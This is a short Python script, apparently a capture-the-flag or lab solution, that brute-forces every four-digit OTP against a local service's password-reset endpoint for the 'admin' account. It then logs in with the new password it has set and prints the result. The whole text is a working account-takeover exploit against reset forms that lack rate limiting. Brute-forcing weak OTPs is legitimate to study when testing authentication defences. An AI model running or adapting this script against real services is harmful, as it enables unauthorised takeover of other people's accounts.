```python
import requests

ip = "127.0.0.1"
port = "7313"

url = f"http://{ip}:{port}/reset"
for i in range(0,10000):
    i = str(i).zfill(4)
    data = {
        "username" : "admin",
        "otp" : f"{i}",
        "newpassword" : "anythingyouwant"
    }
    res = requests.post(url, data=data)
    print(f"Trying OTP: {i}", end="\r")
    if res.text.find("Invalid OTP") == -1:
        url = f"http://{ip}:{port}"
        data = {
            "username" : "admin",
            "password" : "anythingyouwant"
        }
        res = requests.post(url, data=data)
        print(res.text)
        break
```